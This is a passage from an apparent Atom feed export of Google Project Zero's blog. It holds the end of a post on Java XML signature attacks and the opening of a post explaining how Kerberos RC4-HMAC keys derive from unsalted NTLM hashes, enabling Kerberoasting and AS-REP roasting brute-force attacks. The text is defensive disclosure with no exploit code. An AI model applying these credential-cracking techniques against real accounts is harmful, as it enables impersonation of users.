style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; also disables use of the SHA1 algorithm in newer JDK versions. As SHA1 is still widely used by enterprise customers, simply enabling the property without manually configuring a suitable &lt;/span&gt;&lt;span style=\"color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;jdk.xml.dsig.secureValidationPolicy&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; might not be feasible.&lt;/span&gt;&lt;/p&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;Conclusion&lt;/span&gt;&lt;/h2&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;XML signatures in general and SAML in particular offer a large and complex attack surface to external attackers. Even though Java offers configuration options that can be used to address this vulnerability, they are complex, might break real-world use cases and are off by default.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Developers that rely on SAML should make sure they understand the risks associated with it and should reduce the attack surface as much as possible by disabling functionality that is not required for their use case. Additional defense-in-depth approaches like early validation of signing keys, an allow-list based approach to valid transformation chains and strict schema validation of SAML tickets can be used for further hardening.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;/span&gt;\n"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/8124034966884170870/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/11/gregor-samsa-exploiting-java-xml.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/8124034966884170870"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/8124034966884170870"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/11/gregor-samsa-exploiting-java-xml.html","@title":"Gregor Samsa: Exploiting Java's XML Signature Verification"}],"author":{"name":"Google Project Zero","uri":"http://www.blogger.com/profile/08975904405228580347","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-8303427457754488503","published":"2022-10-27T12:48:00.001-07:00","updated":"2023-01-17T15:16:06.866-08:00","title":{"@type":"text","#text":"RC4 Is Still Considered Harmful"},"content":{"@type":"html","#text":"\n\n\n&lt;p&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; white-space: pre-wrap;\"&gt;By James Forshaw, Project Zero&lt;/span&gt;&lt;/p&gt;&lt;span id=\"docs-internal-guid-17a9c8ad-7fff-5625-1f43-45ab13f83d8f\"&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;I've been spending a lot of time researching Windows authentication implementations, specifically Kerberos. In June 2022 I found an interesting issue number &lt;/span&gt;&lt;a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2310\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;2310&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; with the handling of RC4 encryption that allowed you to authenticate as another user if you could either interpose on the Kerberos network traffic to and from the KDC or directly if the user was configured to disable typical pre-authentication requirements.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;This blog post goes into more detail on how this vulnerability works and how I was able to exploit it with only a bare minimum of brute forcing required. Note, I'm not going to spend time fully explaining how Kerberos authentication works, there's plenty of resources online. For example &lt;/span&gt;&lt;a href=\"https://syfuhs.net/a-bit-about-kerberos\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;this blog post&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; by &lt;/span&gt;&lt;a href=\"https://twitter.com/SteveSyfuhs\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;Steve Syfuhs&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; who works at Microsoft is a good first start.&lt;/span&gt;&lt;/p&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;Background&lt;/span&gt;&lt;/h2&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Kerberos is a very old authentication protocol. The current version (v5) was described in &lt;/span&gt;&lt;a href=\"https://datatracker.ietf.org/doc/html/rfc1510\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;RFC1510&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; back in 1993, although it was updated in &lt;/span&gt;&lt;a href=\"https://datatracker.ietf.org/doc/html/rfc4120\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;RFC4120&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; in 2005. As Kerberos' core security concept is using encryption to prove knowledge of a user's credentials the design allows for negotiating the encryption and checksum algorithms that the client and server will use.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;For example when sending the initial authentication service request (AS-REQ) to the Key Distribution Center (KDC) a client can specify a list supported encryption algorithms, as predefined integer identifiers, as shown below in the snippet of the ASN.1 definition from RFC4120.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;KDC-REQ-BODY&amp;nbsp; &amp;nbsp; ::= SEQUENCE {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;etype&amp;nbsp; &amp;nbsp; [8] SEQUENCE OF Int32 -- EncryptionType&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;-- in preference order --,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;When the server receives the request it checks its list of supported encryption types and the ones the user's account supports (which is based on what keys the user has configured) and then will typically choose the one the client most preferred. The selected algorithm is then used for anything requiring encryption, such as generating session keys or the &lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;EncryptedData &lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;structure as shown below:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;EncryptedData &amp;nbsp; ::= SEQUENCE {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;etype &amp;nbsp; [0] Int32 -- EncryptionType --,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;kvno&amp;nbsp; &amp;nbsp; [1] UInt32 OPTIONAL,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;cipher&amp;nbsp; [2] OCTET STRING -- ciphertext&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The KDC will send back an authentication service reply (AS-REP) structure containing the user's &lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Ticket Granting Ticket&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; (TGT) and an &lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;EncryptedData &lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;structure which contains the session key necessary to use the TGT to request service tickets. The user can then use their known key which corresponds to the requested encryption algorithm to decrypt the session key and complete the authentication process.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;\n \n&lt;a href='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRE6Kj-svyxGDL8OhnPM46jhk7cf3JEJrssrRSwToM3q63wAaqtboIVHeEiZ5bONQoHZNapfdxpDr3kXMbxLakja1tqshef6N4GDNlw1BXyhanRY_Jg2zDqTlIPmHZBZ2XvCMf_23GXoRSS-18_zLCfwYV2v4xOR5usrM4zq1AONy2U57oCk-n-BpW/s1062/image5.png' style='display: block; padding: 1em 0; text-align: center;'&gt;&lt;img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRE6Kj-svyxGDL8OhnPM46jhk7cf3JEJrssrRSwToM3q63wAaqtboIVHeEiZ5bONQoHZNapfdxpDr3kXMbxLakja1tqshef6N4GDNlw1BXyhanRY_Jg2zDqTlIPmHZBZ2XvCMf_23GXoRSS-18_zLCfwYV2v4xOR5usrM4zq1AONy2U57oCk-n-BpW/s1062/image5.png' alt=\"Alt Text: Diagram showing the based Kerberos authentication and requesting an AES key type.\" title=\"Alt Text: Diagram showing the based Kerberos authentication and requesting an AES key type.\" border='0' style='max-height: 750px; max-width: 600px;' /&gt;&lt;/a&gt;\n\n&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;This flexibility in selecting an encryption algorithm is both a blessing and a curse. In the original implementations of Kerberos only DES encryption was supported, which by modern standards is far too weak. Because of the flexibility developers were able to add support for AES through &lt;/span&gt;&lt;a href=\"https://datatracker.ietf.org/doc/html/rfc3962\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;RFC3962&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; which is supported by all modern versions of Windows. This can then be negotiated between client and server to use the best algorithm both support. However, unless weak algorithms are explicitly disabled there's nothing stopping a malicious client or server from downgrading the encryption algorithm in use and trying to break Kerberos using cryptographic attacks.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Modern versions of Windows have started to disable DES as a supported encryption algorithm, preferring AES. However, there's another encryption algorithm which Windows supports which is still enabled by default, &lt;/span&gt;&lt;a href=\"https://en.wikipedia.org/wiki/RC4\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;RC4&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;. This algorithm was used in Kerberos by Microsoft for Windows 2000, although its documentation was in draft form until &lt;/span&gt;&lt;a href=\"https://datatracker.ietf.org/doc/html/rfc4757\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;RFC4757&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; was released in 2006.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The RC4 stream cipher has many substantial weaknesses, but when it was introduced it was still considered a better option than DES which has been shown to be sufficiently vulnerable to hardware cracking such as the EFF's \"&lt;/span&gt;&lt;a href=\"https://en.wikipedia.org/wiki/EFF_DES_cracker\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;Deep Crack&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;\". Using RC4 also had the advantage that it was relatively easy to operate in a reduced key size mode to satisfy US export requirements of cryptographic systems.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;If you read the RFC for the implementation of RC4 in Kerberos, you'll notice it doesn't use the stream cipher as is. Instead it puts in place various protections to guard against common cryptographic attacks:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"margin-bottom: 0px; margin-top: 0px; padding-inline-start: 48px;\"&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The encrypted data is protected by a keyed MD5 HMAC hash to prevent tampering which is trivial with a simple stream cipher such as RC4. The hashed data includes a randomly generated 8-byte \"confounder\" so that the hash is randomized even for the same plain text.&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The key used for the encryption is derived from the hash and a base key. This, combined with the confounder makes it almost certain the same key is never reused for the encryption.&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The base key is not the user's key, but instead is derived from a MD5 HMAC keyed with the user's key over a 4 byte message type value. For example the message type is different for the AS-REQ and the AS-REP structures. This prevents an attacker using Kerberos as an encryption oracle and reusing existing encrypted data in unrelated parts of the protocol.&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Many of the known weaknesses of RC4 are related to gathering a significant quantity of ciphertext encrypted with a known key. Due to the design of the RC4-HMAC algorithm and the general functional principles of Kerberos this is not really a significant concern. However, the biggest weakness of RC4 as defined by Microsoft for Kerberos is not so much the algorithm, but the generation of the user's key from their password.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;As already mentioned Kerberos was introduced in Windows 2000 to replace the existing NTLM authentication process used from NT 3.1. However, there was a problem of migrating existing users to the new authentication protocol. In general the KDC doesn't store a user's password, instead it stores a hashed form of that password. For NTLM this hash was generated from the Unicode password using a single pass of the MD4 algorithm. Therefore to make an easy upgrade path Microsoft specified that the RC4-HMAC Kerberos key was this same hash value.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;As the MD4 output is 16 bytes in size it wouldn't be practical to brute force the entire key. However, the hash algorithm has no protections against brute-force attacks for example no salting or multiple iterations. If an attacker has access to ciphertext encrypted using the RC4-HMAC key they can attempt to brute force the key through guessing the password. As user's will tend to choose weak or trivial passwords this increases the chance that a brute force attack would work to recover the key. And with the key the attacker can then authenticate as that user to any service they like.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;To get appropriate cipher text the attacker can make requests to the KDC and specify the encryption type they need. The most well known attack technique is called &lt;/span&gt;&lt;a href=\"https://attack.mitre.org/techniques/T1558/003/\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;Kerberoasting&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;. This technique requests a service ticket for the targeted user and specifies the RC4-HMAC encryption type as their preferred algorithm. If the user has an RC4 key configured then the ticket returned can be encrypted using the RC4-HMAC algorithm. As significant parts of the plain-text is known for the ticket data the attacker can try to brute force the key from that.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;This technique does require the attacker to have an account on the KDC to make the service ticket request. It also requires that the user account has a configured Service Principal Name (SPN) so that a ticket can be requested. Also modern versions of Windows Server will try to block this attack by forcing the use of AES keys which are derived from the service user's password over RC4 even if the attacker only requested RC4 support.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;An alternative form is called &lt;/span&gt;&lt;a href=\"https://attack.mitre.org/techniques/T1558/004/\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;AS-REP Roasting&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;. Instead of requesting a service ticket this relies on the initial authentication requests to return encrypted data. When a user sends an AS-REQ structure, the KDC can look up the user, generate the TGT and its associated session key then return that information encrypted using the user's RC4-HMAC key. At this point the KDC hasn't verified the client knows the user's key before returning the encrypted data, which allows the attacker to brute force the key without needing to have an account themselves on the KDC.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Fortunately this attack is more rare because Windows's Kerberos implementation requires pre-authentication. For a password based logon the user uses their encryption key to encrypt a timestamp value which is sent to the KDC as part of the AS-REQ. The KDC can decrypt the timestamp, check it's within a small time window and only then 